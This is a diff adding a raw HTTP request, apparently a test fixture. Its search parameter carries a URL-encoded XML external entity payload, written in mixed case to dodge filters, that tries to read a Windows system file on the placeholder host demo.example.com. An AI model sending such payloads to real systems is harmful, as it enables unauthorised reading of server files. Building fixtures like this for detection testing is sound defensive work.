@@ -1,0 +1,4 @@
+GET /a?search=<%3FxMl%20VeRsIoN%3D"1.0"%3F><!dOcTyPe%20FoO%20sYsTeM%20"fIlE:///c:/WiNdOwS/wIn.InI"><r/> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
